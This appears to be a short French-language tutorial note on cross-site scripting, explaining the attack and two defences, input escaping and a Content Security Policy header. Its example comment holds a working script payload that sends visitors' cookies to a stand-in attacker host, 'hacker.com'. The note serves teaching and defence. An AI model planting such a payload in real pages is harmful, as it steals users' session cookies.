# XSS

---

Une attaque XSS consiste à injecter du code **JavaScript** dans une page web.

## Fonctionnement de l'attaque

1. Un attaquant poste ce commentaire sur un site :

```html
<script>
  document.location = "http://hacker.com?cookie=" + document.cookie;
</script>
```

2. Tous les utilisateurs qui visitent la page **envoient leurs cookies au pirate**.

## Protection contre le XSS

- Échapper les entrées utilisateur :

```html
&lt;script&gt;alert("hello");&lt;/script&gt;
```

- Utiliser le Content Security Policy (CSP) :

```html
Content-Security-Policy : script-src 'self'
```
